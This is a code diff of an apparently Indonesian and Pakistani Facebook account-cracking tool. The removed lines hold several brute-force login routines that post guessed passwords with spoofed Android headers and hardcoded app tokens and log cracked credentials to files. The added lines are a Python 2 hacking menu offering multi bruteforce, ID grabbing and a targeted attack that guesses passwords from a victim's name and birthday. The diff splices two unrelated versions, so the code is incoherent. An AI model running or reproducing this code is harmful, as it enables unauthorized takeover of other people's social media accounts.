-			ua=random.choice(ugen)
-			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			SK=session.cookies.get_dict().keys()
-			if "c_user" in SK:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [BILAL-OK] %s | %s'%(ids,pas))
-				open('/sdcard/BILAL-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in SK:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/BILAL-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method1rnd
-def trt1(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [BILAL-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                "adid": adid,
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"email": ids,
-"password": pas,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d",}
-                        headers={
-                                'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '45204',
-'X-FB-SIM-HNI': '45201',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': '698'}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [BILAL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [BILAL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
+    os.system('clear')
+    print logo
+    print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
+    print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Informasi Pengguna'
+    print '\x1b[1;37;40m2. Hack Akun Facebook'
+    print '\x1b[1;37;40m3. Bot               '
+    print '\x1b[1;37;40m4. Lainnya....       '
+    print '\x1b[1;37;40m5. LogOut            '
+    print '\x1b[1;31;40m0. Keluar            '
+    print
+    pilih()
 
-def trt2(ids,passlist):
-	global loop
-	global oks
-	try:
-		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [BILAL-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
-			application_version_code=str(random.randint(000000000,999999999))
-			__iam_genius = random.choice(android_models)
-			phone_model = __iam_genius.split('|')[0]
-			phone_company = __iam_genius.split('|')[1]
-			dimensions = __iam_genius.split('|')[2]
-			ffb=random.choice(fbks)
-			dvlk = random.choice(usr)
-			#1 method issue es ma ha
-			ua_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
-			device_family_id = str(uuid.uuid4())
-			adid = str(uuid.uuid4())
-			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
-			data = {'adid':adid,
-				'format':'json',
-				'device_id':device_family_id,
-				'email':ids,
-				'password':pas,
-				'generate_analytics_claim':'1',
-				'community_id':'','cpl':'true','try_num':'1',
-				'family_device_id':device_family_id,
-				'credentials_type':'device_based_login_password',
-				'generate_session_cookies':'1',
-				'error_detail_type':'button_with_disabled',
-				'source':'device_based_login',
-				'machine_id':machine_id,
-				'login_location_accuracy_m':'1.0',
-				'meta_inf_fbmeta':'',
-				'advertiser_id':adid,
-				'encrypted_msisdn':'',
-				'currently_logged_in_userid':'0',
-				'locale':'en_PK',
-				'client_country_code':'PK',
-				'method':'auth.login',
-				'fb_api_req_friendly_name':'authenticate',
-				'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
-				'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			head = {
-				'content-type':'application/x-www-form-urlencoded',
-				'x-fb-sim-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-type':'unknown',
-				'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-				'api_key': '8114af471d039628db5c68cb127af936',
-				'user-agent':ua_string,
-				'x-fb-net-hni':str(random.randint(2e4,4e4)),
-				'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
-				'x-fb-connection-quality':'EXCELLENT',
-				'x-fb-friendly-name':'authenticate',
-				'accept-encoding':'gzip, deflate',
-				'x-fb-http-engine':	'Liger'}
-			url = 'https://b-api.facebook.com/method/auth.login'
-			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
-			q = json.loads(po)
-			if 'session_key' in q:
-				udx = str(q['uid'])
-				print('\r\r\033[1;32m [BILAL-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/BILAL-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;205m [BILAL-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/BILAL-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
-				cps.append(ids)
-				break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(10)
-	except Exception as e:
-		print(e)
-#new method
-                
-def trt3(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [BILAL-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+
+def pilih():
+    zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if zedd == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        pilih()
+    else:
+        if zedd == '1':
+            informasi()
+        else:
+            if zedd == '2':
+                menu_hack()
+            else:
+                if zedd == '3':
+                    menu_bot()
+                else:
+                    if zedd == '4':
+                        lain()
+                    else:
+                        if zedd == '5':
+                            os.system('rm -rf login.txt')
+                            os.system('xdg-open https://www.youtube.com/nganunymous')
+                            keluar()
+                        else:
+                            if zedd == '0':
+                                keluar()
+                            else:
+                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
+                                pilih()
+
+
+def informasi():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+    cok = json.loads(r.text)
+    for p in cok['data']:
+        if id in p['name'] or id in p['id']:
+            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
+            z = json.loads(r.text)
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            try:
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
+            except KeyError:
+                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
+            else:
+                try:
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
+                except KeyError:
+                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak ada'
+                else:
+                    try:
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
+                    except KeyError:
+                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
+                    else:
+                        try:
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
+                        except KeyError:
+                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada'
+
+                        try:
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m        : ' + z['location']['name']
+                        except KeyError:
+                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m        : \x1b[1;91mTidak ada'
+
+                    try:
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
+                    except KeyError:
+                        print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'
+
+                try:
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m       : '
+                    for q in z['education']:
+                        try:
+                            print '\x1b[1;91m                   ~ \x1b[1;97m' + q['school']['name']
+                        except KeyError:
+                            print '\x1b[1;91m                   ~ \x1b[1;91mTidak ada'
+
+                except KeyError:
+                    pass
+
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu()
+    else:
+        print '\x1b[1;91m[\xe2\x9c\x96] Pengguna tidak ditemukan'
+        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+        menu()
+
+
+def menu_hack():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Mini Hack Facebook(\x1b[1;92mTarget\x1b[1;97m)'
+    print '\x1b[1;37;40m2. Multi Bruteforce Facebook'
+    print '\x1b[1;37;40m3. Super Multi Bruteforce Facebook'
+    print '\x1b[1;37;40m4. BruteForce(\x1b[1;92mTarget\x1b[1;97m)'
+    print '\x1b[1;37;40m5. Yahoo Checker'
+    print '\x1b[1;37;40m6. Ambil id/email/hp'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    hack_pilih()
+
+
+def hack_pilih():
+    hack = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if hack == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        hack_pilih()
+    else:
+        if hack == '1':
+            mini()
+        else:
+            if hack == '2':
+                crack()
+                hasil()
+            else:
+                if hack == '3':
+                    super()
+                else:
+                    if hack == '4':
+                        brute()
+                    else:
+                        if hack == '5':
+                            menu_yahoo()
+                        else:
+                            if hack == '6':
+                                grab()
+                            else:
+                                if hack == '0':
+                                    menu()
+                                else:
+                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mTidak ada'
+                                    hack_pilih()
+
+
+def mini():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[ INFO ] Akun target harus berteman dengan akun anda dulu !'
         try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        en = random.choice(['en_US','en_GB'])
-                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
-                               
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
+            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
+            a = json.loads(r.text)
+            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m : ' + a['name']
+            jalan('\x1b[1;91m[+] \x1b[1;92mMemeriksa \x1b[1;97m...')
+            time.sleep(2)
+            jalan('\x1b[1;91m[+] \x1b[1;92mMembuka keamanan \x1b[1;97m...')
+            time.sleep(2)
+            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mMohon Tunggu sebentar \x1b[1;97m...')
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            pz1 = a['first_name'] + '123'
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            y = json.load(data)
+            if 'access_token' in y:
+                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
+                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                menu_hack()
+            else:
+                if 'www.facebook.com' in y['error_msg']:
+                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz1
+                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                    menu_hack()
+                else:
+                    pz2 = a['first_name'] + '12345'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    y = json.load(data)
+                    if 'access_token' in y:
+                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
+                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                        menu_hack()
+                    else:
+                        if 'www.facebook.com' in y['error_msg']:
+                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz2
+                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                            menu_hack()
+                        else:
+                            pz3 = a['last_name'] + '123'
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            y = json.load(data)
+                            if 'access_token' in y:
+                                print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
+                                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                menu_hack()
+                            else:
+                                if 'www.facebook.com' in y['error_msg']:
+                                    print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                                    print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                                    print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                    print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz3
+                                    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                    menu_hack()
                                 else:
-                                        print('\r\r\033[1;32m [BILAL-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        #open('/sdcard/SK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/BILAL-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [BILAL-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BILAL-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#method4
-def trt4(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [BILAL-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                                    lahir = a['birthday']
+                                    pz4 = lahir.replace('/', '')
+                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    y = json.load(data)
+                                    if 'access_token' in y:
+                                        print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                                        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
+                                        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                        menu_hack()
+                                    else:
+                                        if 'www.facebook.com' in y['error_msg']:
+                                            print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
+                                            print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+                                            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
+                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername\x1b[1;97m : ' + id
+                                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword\x1b[1;97m : ' + pz4
+                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                            menu_hack()
+                                        else:
+                                            print '\x1b[1;91m[!] Maaf, gagal membuka password target :('
+                                            print '\x1b[1;91m[!] Cobalah dengan cara lain.'
+                                            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+                                            menu_hack()
+        except KeyError:
+            print '\x1b[1;91m[!] Terget tidak ditemukan'
+            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+            menu_hack()
+
+
+def crack():
+    global file
+    global idlist
+    global passw
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        os.system('clear')
+        print logo
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
